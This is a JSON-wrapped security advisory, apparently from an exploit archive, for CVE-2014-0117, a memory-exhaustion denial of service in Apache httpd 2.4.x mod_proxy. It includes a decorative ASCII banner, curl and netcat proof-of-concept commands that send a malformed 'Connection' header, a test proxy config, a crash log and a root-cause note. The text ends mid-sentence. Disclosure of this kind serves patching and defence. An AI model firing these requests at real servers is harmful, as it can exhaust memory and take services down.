{
    "text": "title : Apache 2.4.x mod_proxy Denial Of Service  ， detail : Apache versions 2.4.x prior to 2.4.10 suffer from a denial of service condition when mod_proxy is in use.  ， cve : advisories | CVE-2014-0117  ，  ， desc :  :  :  :  :  :  :  :  :  :   ，  : + :  : + :  : + :  : + :  : + :  : + :  : + :  : + : + :  : + : + :  : + :  : + :  : + :  : + :  : + :  : + : + :  : + :   ， + : + + : + + : + + : + : + + : + + : + + : + + : + : + + : + + : + + : + + : + + : + + : + : + + : +  ， + # + : + # + : + # + : + # + # + : + # + : + # + + # + : + # + # + : + # + # + : + # + + # + + # + + # + : + # + + # + + : +  ， + # + + # + # + + # + + # + # + + # + + # + # + + # + + # + + # + + # + + # + + # + + # +  ，  # + #  # + # + #  # + #  # + # + #  # + # + #  # + # + #  # + #  # + #  # + #  # + #  # + #  # + #  # + #   ，   ，  : + :  : + : + :  : + : + :  : + :  : + : + :  : + : + : + :  : + :  : + :  : + : + : + :  : + : + : + :  : + :   ， + : + + : + + : + : + + : + + : + : + : + + : + + : + + : + + : + : + : + + : + + : + + : +  ， + # + + # + + : + # + : + #  # + : + + # + + # + + + : + + # + + # + + : + # + : + # + + + : + + # + + # + + # +  ， + # + + # + + # + + # + + # + + # + # + # + + # + # + # + # + # + # + + # + # + # + + # + + # + + # +  ，  # + #  # + #  # + # + # + #  # + #  # + #  # + #  # + #  # + #  # + #  # + #  # + #  # + #  # + #  # + #   ，  ， + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : + : +  ， + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # + # +  ， Hi there ,   ， Software : apache httpd 2.4.7 , possibly others from 2.3 and 2.4 branches.  ， If apache is configured with mod_proxy module ( for example in front of  ， a tomcat , or proxypassing requests to other backend servers )  , it is possible  ， to use all available memory on the server and potenatially cause an OOM  ， condition that requires a reboot. In our tests , a single requests was causing  ， apache to spin and keep allocating memory ( gigabytes in seconds ) . A simple bash  ， script that does this X time can speed the process up.  ， Bug can be triggered in request or response.  ， PoC ( request )  :   ， - cut -  ， curl -H 'Connection :  ; ' http : /127.0.0.1/  ， - cut -  ， PoC ( response )  :   ， printf \"HTTP/1.1 200 OK\\r\\nConnection :  ; \\r\\n\\r\\n\" | nc -l -p 80  ， Example config to replicate it , in httpd.conf :   ， - cut -  ， <Proxy balancer : /mycluster>  ， BalancerMember http : /127.0.0.1 : 8100  ， </Proxy>  ， ProxyPass / balancer : /mycluster  ， - cut -  ， then listen on port 8100 :   ， - cut -  ， nc -l -p 8100  ， - cut -  ， Then send a request with \"Connection :  ; \" header and watch the memory usage.  ， - cut -  ， curl -H 'Connection :  ; ' http : /127.0.0.1/  ， - cut -  ， Single request will usually get killed with the following message :   ， - cut -  ，  [ crit ] Memory allocation failed , aborting process.  ，  [ core : notice ]  [ pid 3205 : tid 139786428621120 ] AH00051 : child pid 4212 exit signal Aborted ( 6 )  , possible coredump in  ， - cut -  ， hence it may be more visible on machines with huge ram by running more requests , ideally  ， concurrently but this should do as well for demonstration purposes :   ， - cut -  ，  ， - cut -  ， Now where the problem is : incorrect parsing in find_conn_headers , it only moves  ， the pointer when it encounters a comma , and calls ap_get_token which returns an empty  ， string as it skips over ' ; '.  ， / key = 'Connection'  ， / val = ' ; '",
    "time": "Jul 22, 2014"
}